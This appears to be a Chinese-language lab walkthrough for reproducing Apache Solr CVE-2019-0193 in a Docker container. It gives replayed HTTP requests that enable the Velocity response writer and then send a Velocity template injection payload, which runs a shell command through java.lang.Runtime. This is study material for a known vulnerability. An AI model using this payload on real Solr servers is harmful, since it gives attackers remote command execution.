# Apache Solr CVE-2019-0193 环境搭建漏洞复现

 docker pull scxiaotan2/apache-solr:cve-2019-0193  # 拉取镜像
 
 docker run -it scxiaotan2/apache-solr:cve-2019-0193 /bin/bash #启动shell

./start.sh #启动根目录下的服务

netstat -tlnp #可以看到1983端口启用了


# Solr CVE-2019-0193 漏洞复现

使用BurpSuite 对数据包重放

第一步：

GET /solr/te1/config HTTP/1.1

Host: 172.17.0.3:8983

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: application/json, text/plain, */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://172.17.0.3:8983/solr/

Connection: close

第二步：

post /solr/te1/config HTTP/1.1

Host: 172.17.0.3:8983

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: application/json, text/plain, */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://172.17.0.3:8983/solr/

Connection: close

Content-Length: 259




{

  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }

}


第三步：

post /solr/te1/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end  HTTP/1.1

Host: 172.17.0.3:8983

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: application/json, text/plain, */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://172.17.0.3:8983/solr/

Connection: close

Content-Length: 259




{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
